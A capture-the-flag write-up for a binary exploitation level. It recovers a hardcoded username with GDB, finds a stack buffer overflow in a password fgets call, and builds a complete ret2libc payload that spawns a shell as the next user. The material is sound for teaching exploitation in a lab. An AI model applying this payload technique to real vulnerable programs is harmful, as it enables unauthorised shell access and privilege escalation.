# Level01

First step - testing the program

    $ ./level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: coucou
    verifying username....

    nope, incorrect username...

The program ask a username

Start in GDB

The program use fgets for asking the inputs

First there is a function `verify_user_name` for check the username

    0x08048528 <+88>:	call   0x8048370 <fgets@plt>
    0x0804852d <+93>:	call   0x8048464 <verify_user_name>


The function do manual things equivalent to an strncmp on the input and the string `dat_wil`

    (gdb) disas verify_user_name
    Dump of assembler code for function verify_user_name:
    0x0804846c <+8>:	mov    DWORD PTR [esp],0x8048690    <--- "verifying username....\n"
    0x08048473 <+15>:	call   0x8048380 <puts@plt>
    0x08048478 <+20>:	mov    edx,0x804a040    <--- "dat_wil\n"
    0x0804847d <+25>:	mov    eax,0x80486a8    <--- "dat_wil"
    0x08048482 <+30>:	mov    ecx,0x7          <--- maximum ncmp
    0x08048487 <+35>:	mov    esi,edx
    0x08048489 <+37>:	mov    edi,eax
    0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x0804848d <+41>:	seta   dl
    0x08048490 <+44>:	setb   al
    0x08048493 <+47>:	mov    ecx,edx
    0x08048495 <+49>:	sub    cl,al
    0x08048497 <+51>:	mov    eax,ecx
    0x08048499 <+53>:	movsx  eax,al
    0x0804849c <+56>:	add    esp,0x10
    0x0804849f <+59>:	pop    esi
    0x080484a0 <+60>:	pop    edi
    0x080484a1 <+61>:	pop    ebp
    0x080484a2 <+62>:	ret    
    End of assembler dump.

Try to enter `dat_wil` in the input

    (gdb) r
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 

Good, the program continue and ask the password

In the disassembly, we can see also a function `verify_user_pass` after the second fgets

    0x08048574 <+164>:	call   0x8048370 <fgets@plt>
    0x08048579 <+169>:	lea    eax,[esp+0x1c]
    0x0804857d <+173>:	mov    DWORD PTR [esp],eax
    0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>

The function do manual things equivalent to an strncmp, like the first function, on the input and the string `admin`

    (gdb) disas verify_user_pass
    Dump of assembler code for function verify_user_pass:
    0x080484a3 <+0>:	push   ebp
    0x080484a4 <+1>:	mov    ebp,esp
    0x080484a6 <+3>:	push   edi
    0x080484a7 <+4>:	push   esi
    0x080484a8 <+5>:	mov    eax,DWORD PTR [ebp+0x8]
    0x080484ab <+8>:	mov    edx,eax
    0x080484ad <+10>:	mov    eax,0x80486b0    <--- "admin"
    0x080484b2 <+15>:	mov    ecx,0x5
    0x080484b7 <+20>:	mov    esi,edx
    0x080484b9 <+22>:	mov    edi,eax
    0x080484bb <+24>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
    0x080484bd <+26>:	seta   dl
    0x080484c0 <+29>:	setb   al
    0x080484c3 <+32>:	mov    ecx,edx
    0x080484c5 <+34>:	sub    cl,al
    0x080484c7 <+36>:	mov    eax,ecx
    0x080484c9 <+38>:	movsx  eax,al
    0x080484cc <+41>:	pop    esi
    0x080484cd <+42>:	pop    edi
    0x080484ce <+43>:	pop    ebp
    0x080484cf <+44>:	ret    
    End of assembler dump.

But the password "admin" does not work

    (gdb) r
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 
    admin
    nope, incorrect password...

    [Inferior 1 (process 1858) exited with code 01]

In the code we can see the fgets call :

    0x0804855c <+140>:	mov    eax,ds:0x804a020
    0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
    0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
    0x0804856d <+157>:	lea    eax,[esp+0x1c]
    0x08048571 <+161>:	mov    DWORD PTR [esp],eax
    0x08048574 <+164>:	call   0x8048370 <fgets@plt>

The buffer is stored on `esp+0x1c`. The fgets will read 0x64 (100)

At the top of the main, there is a bzero on this buffer :

    0x080484db <+11>:	lea    ebx,[esp+0x1c]
    0x080484df <+15>:	mov    eax,0x0
    0x080484e4 <+20>:	mov    edx,0x10
    0x080484e9 <+25>:	mov    edi,ebx
    0x080484eb <+27>:	mov    ecx,edx
    0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax

We can deduct the buffer size with the bzero : `0x10` (16)

The fgets will overflow, let's try!

    (gdb) r
    Starting program: /home/users/level01/level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: dat_wil
    verifying username....

    Enter Password: 
    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
    nope, incorrect password...


    Program received signal SIGSEGV, Segmentation fault.
    0x55555555 in ?? ()

    ./get_offset.py 55
    U => offset = 80

We have EIP, start at the offset 80

Exploit this with a ret2libc. We need system, exit and a "/bin/sh" string addresses

    (gdb) info proc map
    process 1884
    Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
        0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
        0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fd8000 0xf7fdb000     0x3000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
    (gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
    0xf7f897ec
    1 pattern found.
    (gdb) x/s 0xf7f897ec
    0xf7f897ec:	 "/bin/sh"

The address of the "/bin/sh" string is `0xf7f897ec`

    (gdb) info function system
    All functions matching regular expression "system":

    Non-debugging symbols:
    0xf7e6aed0  __libc_system
    0xf7e6aed0  system
    0xf7f48a50  svcerr_systemerr

Address of system : `0xf7e6aed0`

    (gdb) info function exit
    All functions matching regular expression "exit":

    Non-debugging symbols:
    0xf7e5eb70  exit
    0xf7e5eba0  on_exit
    0xf7e5edb0  __cxa_atexit
    0xf7e5ef50  quick_exit
    0xf7e5ef80  __cxa_at_quick_exit
    0xf7ee45c4  _exit
    0xf7f27ec0  pthread_exit
    0xf7f2d4f0  __cyg_profile_func_exit
    0xf7f4bc30  svc_exit
    0xf7f55d80  atexit

Address of exit : `0xf7e5eb70`

Build the payload!

    ("B" * 80) + "system" + "ret = exit" + "/bin/sh"

    $ python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload

    $ cat /tmp/payload - | ./level01 
    ********* ADMIN LOGIN PROMPT *********
    Enter Username: verifying username....

    Enter Password: 
    nope, incorrect password...

    whoami
    level02
